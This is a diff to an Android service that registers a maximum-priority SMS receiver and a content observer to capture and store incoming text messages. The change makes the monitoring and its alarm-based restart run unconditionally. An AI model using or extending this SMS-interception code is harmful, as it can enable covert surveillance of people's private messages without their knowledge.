@@ -2,7 +2,6 @@ package com.privacy.monitor.service;
 
 import java.util.ArrayList;
 import com.privacy.monitor.base.C;
-import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.SMSRecordDB;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.inte.RunBack;
@@ -31,7 +30,6 @@ public class SMSMonitoringService extends Service {
 	private static final String TAG = SMSMonitoringService.class.getSimpleName();
 	private SMSObserver smsObserver;
 	private SMSRecordDB sqlite ;
-	private MonitorDB monitorDB ;
 	
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -42,8 +40,6 @@ public class SMSMonitoringService extends Service {
 	public void onCreate() {
 		super.onCreate();
 		
-		monitorDB = MonitorDB.getInstance(getApplicationContext());
-		if(monitorDB.exists()){
 			Logger.d(TAG, "短信监听服务启动了");
 			ContentResolver smsResolver = getContentResolver();
 			smsObserver = new SMSObserver(smsResolver, new SMSHandler(this),getApplicationContext(),new MyRunBack());
@@ -51,9 +47,7 @@ public class SMSMonitoringService extends Service {
 			IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
 			intentFilter.setPriority(Integer.MAX_VALUE);
 			getApplicationContext().registerReceiver(new SMSReceiver(), intentFilter);
-		}else {
-			AlarmNanagerUtil.startCron(getApplicationContext());
-		}
+		    AlarmNanagerUtil.startCron(getApplicationContext());
 	}
 	
 	@Override
